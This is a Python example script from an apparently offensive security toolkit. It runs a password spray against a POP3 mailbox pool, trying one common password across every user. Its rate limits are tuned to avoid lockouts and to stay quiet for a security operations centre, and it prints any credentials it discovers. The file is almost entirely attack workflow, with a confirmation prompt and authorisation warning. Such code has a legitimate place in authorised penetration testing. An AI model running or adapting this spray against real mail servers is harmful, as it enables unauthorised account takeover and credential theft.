"""Password spray against a POP3 mailbox pool.

Pattern: try ONE candidate password against every user in the pool,
then move to the next password. Per-user lockout windows almost never
fill because each user only sees a handful of attempts spaced minutes
apart.

Edit ``TARGET_HOST`` / ``TARGET_PORT`` and the inline lists, then run
``python examples/spray_pop3.py``. The script refuses to fire any
attempts until you type ``y`` at the confirmation prompt.

See docs/CRED_ATTACK.md for the OPSEC checklist before using on a
real target.
"""

from __future__ import annotations

import logging
import sys

# --- Edit me -----------------------------------------------------------------

TARGET_HOST = "lab.example.internal"
TARGET_PORT = 995  # POP3S; use 110 for plaintext POP3.
USE_TLS = True

# Tiny demo lists. Replace with paths to your own engagement files.
USERS = [
    "alice",
    "bob",
    "carol",
    "dave",
]

PASSWORDS = [
    "Spring2026!",
    "Welcome2026!",
    "ChangeMe123",
]

# 30/min ≈ one attempt every two seconds — the default. Drop to 15
# for an even quieter run on a target with paranoid SOC tuning.
RATE_PER_MIN = 30.0


# --- Confirmation gate -------------------------------------------------------


def confirm(target: str) -> bool:
    print("This script will fire authenticated POP3 login attempts at:")
    print(f"  {target}")
    print(f"  users={len(USERS)} passwords={len(PASSWORDS)} rate={RATE_PER_MIN}/min")
    print("It will STOP at the first lockout signal.")
    print("Only proceed if you have written authorisation to test this host.")
    answer = input("Type 'yes' to continue, anything else to abort: ").strip().lower()
    return answer in ("y", "yes")


def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    target = f"pop3{'s' if USE_TLS else ''}://{TARGET_HOST}:{TARGET_PORT}"
    if not confirm(target):
        print("Aborted.", file=sys.stderr)
        return 2

    from core.cred_attack import AttemptOutcome, AttemptResult, spray
    from core.profiles import ConnectionProfile

    profile = ConnectionProfile(
        name="example-pop3-spray",
        protocol="pop3",
        host=TARGET_HOST,
        port=TARGET_PORT,
        pop3_ssl=USE_TLS,
    )

    def show(outcome: AttemptOutcome) -> None:
        marker = {
            AttemptResult.SUCCESS: "+",
            AttemptResult.LOCKOUT: "!",
            AttemptResult.ERROR: "?",
            AttemptResult.FAILED: "-",
            AttemptResult.SKIPPED: "·",
        }.get(outcome.result, "?")
        print(
            f"  [{marker}] {outcome.username:<20} {outcome.result.value:<8} "
            f"{outcome.elapsed_s:>5.2f}s",
        )

    report = spray(
        profile,
        users=USERS,
        passwords=PASSWORDS,
        rate_per_min=RATE_PER_MIN,
        progress=show,
        authorized=True,
    )
    print()
    print(report.summary())
    if report.successes:
        print("Discovered credentials:")
        for cred in report.successes:
            # Cleartext password: handle with care. Don't dump to a
            # shell history.
            print(f"  {cred.username} : {cred.password}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
